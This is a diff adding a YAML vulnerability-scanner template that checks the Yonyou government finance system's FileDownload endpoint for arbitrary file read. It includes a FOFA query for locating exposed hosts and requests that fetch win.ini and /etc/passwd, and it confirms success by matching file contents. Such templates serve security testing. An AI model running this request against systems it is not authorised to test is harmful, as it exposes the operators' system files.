@@ -1,0 +1,37 @@
+id: poc-yaml-yongyou-zhengwu-filedownload-anyfile-read
+info:
+  name: 用友政务财务系统 FileDownload 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友政务财务系统
+  fofa: app="用友-政务财务系统"
+variables:
+  path: 'C://Windows//win.ini
+
+    /etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /bg/attach/FileDownload?execlPath={{.path}}
+  expression: '(
+
+    (status_code == 200 && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"for 16-bit app support") && contains(headers,"filename=C://Windows//win.ini"))
+
+    ||
+
+    (contains(body,"root:") && contains(body,"/bin") && contains(headers,"filename=passwd"))
+
+    )
+
+    )
+
+    '
+transport: http
